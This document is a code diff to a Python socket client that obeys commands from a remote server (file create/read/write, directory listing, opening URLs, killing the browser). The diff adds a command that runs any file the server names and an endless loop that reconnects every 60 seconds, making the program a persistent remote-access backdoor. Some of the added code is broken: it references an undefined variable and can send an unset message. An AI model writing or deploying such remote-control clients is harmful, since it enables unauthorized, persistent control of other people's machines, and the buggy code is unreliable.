@@ -1,6 +1,8 @@
 import socket
 import os
 import subprocess
+import sys
+import time #using time module to retry connection every 1 minute.
 
 def client():
 
@@ -34,6 +36,8 @@ def client():
             makeDirectories(mySocket,receiving_message)
         elif receiving_message[0:6] == 'create':
             createFile(mySocket,receiving_message)
+        elif receiving_message[0:7] == 'execute':
+            executeFile(mySocket,receiving_message)
         elif receiving_message[0:4] == 'read':
             readFile(mySocket,receiving_message)
         elif receiving_message[0:5] == 'write':
@@ -148,6 +152,24 @@ def listOfFilesAndFolders(mySocket):
     sending_message = os.listdir(os.getcwd())
     mySocket.send((str(sending_message)).encode())
 
+
+
+def executeFile(mySocket,receiving_message):
+    try:
+        if sys.platform == "win32":
+            os.startfile(receiving_message[8:])
+        else:
+            opener ="open" if sys.platform == "darwin" else "xdg-open"
+            subprocess.call([opener, filename])
+    except FileNotFoundError:
+        sending_message = 'Error file not found'
+    except:
+        sending_message = "Error something went wrong"
+    finally:
+        mySocket.send(sending_message.encode())
+
+
+
     
 def openURL(mySocket,receiving_message):
     # open given url in google chrome broswer using subprocess module
@@ -166,7 +188,13 @@ def killTheBrowser(mySocket):
 
 
 
+
 if __name__ == "__main__":
-    client()
+   while True:
+    try:
+        client()
+    except:
+        print("could not connect")
+        time.sleep(60) # sleep for 60 seconds before retrying to connect
 
 
